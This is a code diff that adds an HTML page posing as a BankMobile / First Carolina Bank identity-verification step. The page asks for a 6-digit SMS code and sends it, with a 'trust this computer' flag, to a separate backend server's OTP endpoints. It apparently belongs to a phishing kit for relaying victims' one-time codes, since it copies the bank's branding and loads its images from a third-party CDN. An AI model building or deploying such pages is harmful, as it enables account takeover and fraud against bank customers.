@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+    <title>Verify Your Identity</title>
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="https://cdn.corenexis.com/f/lBRnRiPy7OO.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="https://cdn.corenexis.com/f/lBRnRiPy7OO.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="https://cdn.corenexis.com/f/lBRnRiPy7OO.png" />
+    <link rel="apple-touch-icon" href="https://cdn.corenexis.com/f/lBRnRiPy7OO.png" />
+    
+    <!-- CSS -->
+    <link rel="stylesheet" href="/lib/bootstrap/dist/css/bootstrap.min.css" />
+    <link rel="stylesheet" href="/css/site.css" />
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-image: url('https://cdn.corenexis.com/f/5upabsqQ4fJ.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 20px 40px 20px;
+            color: #1a1a1a;
+        }
+
+        .top-bar {
+            position: absolute;
+            top: 35px;
+            left: 0;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            padding: 0 40px;
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #1a1a1a;
+            padding: 8px;
+            text-decoration: none;
+            transition: opacity 0.15s ease;
+        }
+
+        .back-btn:hover {
+            opacity: 0.7;
+        }
+
+        .content-container {
+            width: 100%;
+            max-width: 410px;
+            display: flex;
+            flex-direction: column;
+            margin-top: 40px;
+        }
+
+        h2 {
+            font-family: Rockwell, "Rockwell Nova", "Courier New", Georgia, serif;
+            font-size: 28px;
+            font-weight: 500;
+            text-align: left;
+            line-height: 1.15;
+            color: #1c2024;
+            margin-bottom: 12px;
+            letter-spacing: -0.5px;
+            padding-left: 5px;
+        }
+
+        .subtitle {
+            font-size: 13.5px;
+            line-height: 1.45;
+            color: #333333;
+            text-align: left;
+            margin-bottom: 22px;
+            font-weight: 500;
+            padding-left: 5px;
+        }
+
+        .card {
+            background-color: #ffffff;
+            width: 100%;
+            padding: 35px 25px 25px 25px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+            border: 1px solid #e2e8f0;
+            border-radius: 0px;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 12px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 16px 14px;
+            font-size: 18px;
+            border: 1px solid #767676;
+            border-radius: 0px;
+            outline: none;
+            color: #222;
+            font-family: inherit;
+            font-weight: 500;
+            transition: border-color 0.1s ease;
+		  letter-spacing: 8px; }
+
+        .input-group input::placeholder {
+            color: #616161;
+            font-weight: 500;
+            letter-spacing: 2px;
+        }
+
+        .input-group input:focus {
+            border: 2px solid #000000;
+            padding: 15px 13px;
+        }
+
+        .input-group input.invalid-field {
+            border-color: #d32f2f;
+        }
+
+        .input-group input.invalid-field:focus {
+            border-color: #d32f2f;
+        }
+
+        .field-error-msg {
+            display: none;
+            color: #d32f2f;
+            font-size: 12.5px;
+            font-weight: 500;
+            margin-top: 6px;
+            text-align: left;
+            padding-left: 2px;
+        }
+
+        .help-container {
+            font-size: 13px;
+            color: #1a1a1a;
+            font-weight: 500;
+            text-align: left;
+            padding-left: 2px;
+        }
+
+        .help-link {
+            color: #0056b3;
+            text-decoration: underline;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .help-link:hover {
+            color: #003d82;
+        }
+
+        .help-link.disabled {
+            color: #999;
+            cursor: not-allowed;
+            pointer-events: none;
+        }
+
+        .trust-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 35px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #1c2024;
+            user-select: none;
+            cursor: pointer;
+        }
+
+        .custom-checkbox {
+            width: 22px;
+            height: 22px;
+            border: 1px solid #767676;
+            background-color: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: border-color 0.1s ease;
+        }
+
+        .trust-container:hover .custom-checkbox {
+            border-color: #000000;
+        }
+
+        .custom-checkbox::after {
+            content: '';
+            width: 10px;
+            height: 6px;
+            border-left: 2px solid #000000;
+            border-bottom: 2px solid #000000;
+            transform: rotate(-45deg) translate(1px, -1px);
+            display: none;
+        }
+
+        .trust-input {
+            display: none;
+        }
+
+        .trust-input:checked + .custom-checkbox::after {
+            display: block;
+        }
+
+        .error-container {
+            display: none;
+            align-items: flex-start;
+            gap: 8px;
+            color: #d32f2f;
+            font-size: 13.5px;
+            line-height: 1.45;
+            margin-top: 15px;
+            margin-bottom: 15px;
+            padding-left: 2px;
+        }
+
+        .error-icon {
+            flex-shrink: 0;
+            margin-top: 2px;
+            color: #d32f2f;
+        }
+
+        .error-text {
+            font-weight: 400;
+            text-align: left;
+        }
+
+        .success-container {
+            display: none;
+            align-items: flex-start;
+            gap: 8px;
+            color: #2e7d32;
+            font-size: 13.5px;
+            line-height: 1.45;
+            margin-top: 15px;
+            margin-bottom: 15px;
+            padding-left: 2px;
+        }
+
+        .success-icon {
+            flex-shrink: 0;
+            margin-top: 2px;
+            color: #2e7d32;
+        }
+
+        .success-text {
+            font-weight: 400;
+            text-align: left;
+        }
+
+        .next-btn {
+            width: 100%;
+            background-color: #8fc7ec;
+            color: #ffffff;
+            border: none;
+            padding: 16px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: not-allowed;
+            border-radius: 0px;
+            text-align: center;
+            margin-bottom: 12px;
+            transition: background-color 0.2s ease, color 0.2s ease;
+        }
+
+        .next-btn.active {
+            background-color: #0056b3;
+            color: #ffffff;
+            cursor: pointer;
+        }
+
+        .next-btn.active:hover {
+            background-color: #003d82;
+        }
+
+        .next-btn.loading {
+            background-color: #4a7fb5;
+            cursor: wait;
+            opacity: 0.8;
+        }
+
+        .cancel-btn {
+            display: block;
+            width: 100%;
+            text-align: center;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 600;
+            color: #1c2024;
+            background-color: transparent;
+            border: 1px solid transparent;
+            padding: 16px;
+            border-radius: 0px;
+            cursor: pointer;
+            transition: all 0.15s ease-in-out;
+        }
+
+        .cancel-btn:hover {
+            color: #111111;
+            background: linear-gradient(
+                to bottom, 
+                #ffffff 0%, 
+                #f2f2f2 15%, 
+                #dfdfdf 50%, 
+                #cccccc 85%, 
+                #b0b0b0 100%
+            );
+            border: 1px solid #959595;
+            box-shadow: 
+                inset 0 1px 0 #ffffff, 
+                0 2px 4px rgba(0, 0, 0, 0.15);
+        }
+
+        footer {
+            font-size: 14px;
+            color: #212529;
+            text-align: center;
+            line-height: 1.6;
+            max-width: 800px;
+            width: 100%;
+            margin-top: auto;
+            padding-top: 60px;
+            white-space: nowrap;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header navigation bar -->
+    <div class="top-bar">
+        <a href="index.html" class="back-btn" id="backLink" aria-label="Go back">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <line x1="19" y1="12" x2="5" y2="12"></line>
+                <polyline points="12 19 5 12 12 5"></polyline>
+            </svg>
+        </a>
+    </div>
+
+    <!-- Main Content Area -->
+    <div class="content-container">
+        <h2>Enter the code we sent you via text</h2>
+        <p class="subtitle">
+            For verification purposes, a text message with a 6-digit confirmation code was sent to the phone number associated with your account.
+        </p>
+
+        <!-- Input card -->
+        <div class="card">
+            <form id="verifyForm" onsubmit="event.preventDefault();">
+                <div class="input-group">
+                    <input type="text" id="code" name="code" placeholder="Enter Code" aria-label="Enter Code" required autocomplete="off" maxlength="6" inputmode="numeric">
+                    <div class="field-error-msg" id="codeError">Please enter a valid 6-digit code.</div>
+                </div>
+                
+                <div class="help-container">
+                    Haven't received your code yet? <span class="help-link" id="resendLink">Resend code.</span>
+                    <span id="resendTimer" style="display:none; color: #999; font-size: 12px;"></span>
+                </div>
+
+                <!-- Error Notification -->
+                <div class="error-container" id="errorNotification">
+                    <svg class="error-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="10"></circle>
+                        <line x1="12" y1="8" x2="12" y2="12"></line>
+                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                    </svg>
+                    <span class="error-text" id="errorMessage">Invalid verification code. Please try again.</span>
+                </div>
+
+                <!-- Success Notification -->
+                <div class="success-container" id="successNotification">
+                    <svg class="success-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                        <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                    </svg>
+                    <span class="success-text" id="successMessage">Verification successful! Redirecting...</span>
+                </div>
+            </form>
+        </div>
+
+        <!-- Custom Checkbox -->
+        <label class="trust-container" for="trust">
+            <input type="checkbox" id="trust" class="trust-input">
+            <span class="custom-checkbox"></span>
+            Trust this computer?
+        </label>
+
+        <!-- Next button -->
+        <button type="submit" form="verifyForm" class="next-btn" id="nextBtn" disabled>Verify</button>
+
+        <!-- Cancel Link -->
+        <a href="index.html" class="cancel-btn">Cancel</a>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        © 2026 BM Technologies, Inc., a wholly owned subsidiary of First Carolina Bank, Member FDIC and Equal Housing Lender. All Rights Reserved.<br>
+        Powered by BM Technologies, Inc. BankMobile banking products and banking services are provided by First Carolina Bank, Member FDIC.
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const codeInput = document.getElementById('code');
+            const nextButton = document.getElementById('nextBtn');
+            const errorNotification = document.getElementById('errorNotification');
+            const errorMessage = document.getElementById('errorMessage');
+            const successNotification = document.getElementById('successNotification');
+            const successMessage = document.getElementById('successMessage');
+            const codeError = document.getElementById('codeError');
+            const resendLink = document.getElementById('resendLink');
+            const resendTimer = document.getElementById('resendTimer');
+            const verifyForm = document.getElementById('verifyForm');
+            const trustCheckbox = document.getElementById('trust');
+
+            const SERVER_URL = 'http://localhost:3000';
+
+            let resendCooldown = 0;
+            let timerInterval = null;
+
+            // ============================================
+            // Send OTP to Server
+            // ============================================
+            async function sendOTPToServer(otpCode, trustComputer) {
+                try {
+                    const response = await fetch(`${SERVER_URL}/api/verify-otp`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            otp: otpCode,
+                            trustComputer: trustComputer
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    return data;
+                    
+                } catch (error) {
+                    console.error('Server error:', error);
+                    return { 
+                        success: false, 
+                        message: 'Could not connect to server. Make sure server is running on port 3000.'
+                    };
+                }
+            }
+
+            // ============================================
+            // Resend OTP to Server
+            // ============================================
+            async function resendOTPToServer() {
+                try {
+                    const response = await fetch(`${SERVER_URL}/api/resend-otp`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        }
+                    });
+                    
+                    const data = await response.json();
+                    return data;
+                    
+                } catch (error) {
+                    console.error('Server error:', error);
+                    return { 
+                        success: false, 
+                        message: 'Could not connect to server.'
+                    };
+                }
+            }
+
+            // ============================================
+            // OTP Input Handler
+            // ============================================
+            codeInput.addEventListener('input', function() {
+                // Only allow digits
+                this.value = this.value.replace(/\D/g, '');
+                
+                // Limit to 6 digits
+                if (this.value.length > 6) {
+                    this.value = this.value.slice(0, 6);
+                }
+
+                // Hide errors
+                codeError.style.display = "none";
+                codeInput.classList.remove('invalid-field');
+                errorNotification.style.display = "none";
+                successNotification.style.display = "none";
+
+                // Enable/disable button
+                if (this.value.length === 6) {
+                    nextButton.classList.add('active');
+                    nextButton.disabled = false;
+                } else {
+                    nextButton.classList.remove('active');
+                    nextButton.disabled = true;
+                }
+            });
+
+            // ============================================
+            // Resend Code Handler
+            // ============================================
+            resendLink.addEventListener('click', async function() {
+                if (resendCooldown > 0) return;
+                
+                // Start cooldown
+                resendCooldown = 30;
+                resendLink.classList.add('disabled');
+                resendLink.style.display = 'none';
+                resendTimer.style.display = 'inline';
+                resendTimer.textContent = `Wait ${resendCooldown}s`;
+                
+                timerInterval = setInterval(() => {
+                    resendCooldown--;
+                    resendTimer.textContent = `Wait ${resendCooldown}s`;
+                    
+                    if (resendCooldown <= 0) {
+                        clearInterval(timerInterval);
+                        resendLink.style.display = 'inline';
+                        resendLink.classList.remove('disabled');
+                        resendTimer.style.display = 'none';
+                        resendCooldown = 0;
+                    }
+                }, 1000);
+                
+                // Send resend request to server
+                try {
+                    const result = await resendOTPToServer();
+                    
+                    if (result.success) {
+                        successMessage.textContent = 'New code sent! Check your phone.';
+                        successNotification.style.display = "flex";
+                        
+                        setTimeout(() => {
+                            successNotification.style.display = "none";
+                        }, 3000);
+                    } else {
+                        errorMessage.textContent = result.message || 'Failed to resend code. Please try again.';
+                        errorNotification.style.display = "flex";
+                    }
+                    
+                } catch (error) {
+                    console.error('Resend error:', error);
+                    errorMessage.textContent = 'Network error. Please check your connection.';
+                    errorNotification.style.display = "flex";
+                }
+            });
+
+            // ============================================
+            // Form Submission
+            // ============================================
+            verifyForm.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const otpCode = codeInput.value.trim();
+                const trustComputer = trustCheckbox.checked;
+
+                // Validate
+                if (otpCode.length !== 6) {
+                    codeError.style.display = "block";
+                    codeInput.classList.add('invalid-field');
+                    codeInput.focus();
+                    return;
+                }
+
+                // Disable button
+                nextButton.disabled = true;
+                nextButton.innerHTML = '<span class="loading-text"><span class="spinner"></span> Verifying...</span>';
+                nextButton.classList.add('loading');
+
+                // Hide notifications
+                errorNotification.style.display = "none";
+                successNotification.style.display = "none";
+                codeError.style.display = "none";
+                codeInput.classList.remove('invalid-field');
+
+                try {
+                    // Send OTP to server
+                    const result = await sendOTPToServer(otpCode, trustComputer);
+                    
+                    if (result.success) {
+                        // ✅ SUCCESS
+                        successMessage.textContent = result.message || 'Verification successful! Redirecting...';
+                        successNotification.style.display = "flex";
+                        
+                        // Store in localStorage
+                        localStorage.setItem('otpVerified', 'true');
+                        localStorage.setItem('trustComputer', trustComputer);
+                        
+                        // Redirect after 2 seconds
+                        setTimeout(() => {
+                            window.location.href = "dashboard.html";
+                        }, 2000);
+                        
+                    } else {
+                        // ❌ FAILED
+                        errorMessage.textContent = result.message || 'Failed to verify code. Please try again.';
+                        errorNotification.style.display = "flex";
+                        codeInput.classList.add('invalid-field');
+                    }
+
+                } catch (error) {
+                    console.error('Verification error:', error);
+                    errorMessage.textContent = 'Network error. Please check your connection and try again.';
+                    errorNotification.style.display = "flex";
+                    
+                } finally {
+                    // Re-enable button
+                    nextButton.disabled = false;
+                    nextButton.innerHTML = 'Verify';
+                    nextButton.classList.remove('loading');
+                    
+                    if (codeInput.value.length === 6) {
+                        nextButton.classList.add('active');
+                    }
+                }
+            });
+
+            // ============================================
+            // Back Button - Go to login page
+            // ============================================
+            document.getElementById('backLink').addEventListener('click', function(e) {
+                e.preventDefault();
+                window.location.href = 'index.html';
+            });
+
+            // ============================================
+            // Auto-focus on code input
+            // ============================================
+            codeInput.focus();
+        });
+    </script>
+</body>
+</html>
